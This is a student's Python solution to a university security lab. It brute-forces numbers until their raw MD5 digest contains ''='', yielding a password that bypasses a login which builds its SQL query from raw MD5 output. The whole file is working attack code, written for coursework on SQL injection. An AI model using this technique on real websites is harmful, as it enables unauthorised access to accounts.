#!/usr/bin/env python


from pymd5 import md5
import os, random, re, time


'''
NAME: Seunghun Oh
CS558 Lab 4 #1-2

This program finds a valid SQL injection input where the PHP script of a website
that encrypts its password using an MD5 but inputs raw binary into the password
query. This program takes advantage of that by using the fact that '=' will create
a False = False statement, which is true in MySQL binary. The program creates
random integer to be hashed, hash it, then check if '=' is part of the raw binary
input.

Collaborators: Brian Roach
Resource: http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
Number of late days on this assignment: 0
Number of total late days: 0
'''

start = time.time()
while(True):
    test = "nope'='nope"
    maxint = (2**32)/2 - 1
    teststr = ""
    for i in range(0,3):
        teststr += str(random.randint(0, maxint))
    match = re.search(r"'='", md5(teststr).digest())
    #print md5(teststr).digest()
    if match:
        print("SQL input:\t", teststr)
        break
end = time.time()
print("Elapsed time:\t", end - start, "seconds")
